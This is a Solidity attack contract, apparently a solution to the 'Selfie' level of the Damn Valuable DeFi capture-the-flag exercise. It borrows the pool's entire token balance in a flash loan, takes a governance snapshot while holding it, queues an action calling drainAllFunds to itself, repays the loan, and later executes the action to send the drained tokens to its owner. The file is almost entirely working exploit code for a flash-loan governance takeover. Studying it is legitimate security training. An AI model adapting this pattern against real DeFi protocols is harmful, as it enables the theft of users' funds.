// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttack is Ownable{
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot private token;
    uint256 private actionId;

    constructor(address selfiePoolAddress, address simpleGovernanceAddress) Ownable() {
        selfiePool = SelfiePool(selfiePoolAddress);
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
        token = DamnValuableTokenSnapshot(address(selfiePool.token()));  //?
    }


    modifier onlyLoaner() {
        require(address(selfiePool) == _msgSender());
        _;
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external onlyLoaner {
        require(tokenAddress == address(token));
        token.snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool)
                ,abi.encodeWithSignature(
                    "drainAllFunds(address)",
                    address(this))
                ,0);
        token.transfer(address(selfiePool), borrowAmount);
    }

    function start() external onlyOwner {
        selfiePool.flashLoan(token.balanceOf(address(selfiePool)));
    }

    function execute() external onlyOwner {
        simpleGovernance.executeAction(actionId);
        token.transfer(msg.sender, token.getBalanceAtLastSnapshot(address(this)));
    }
}
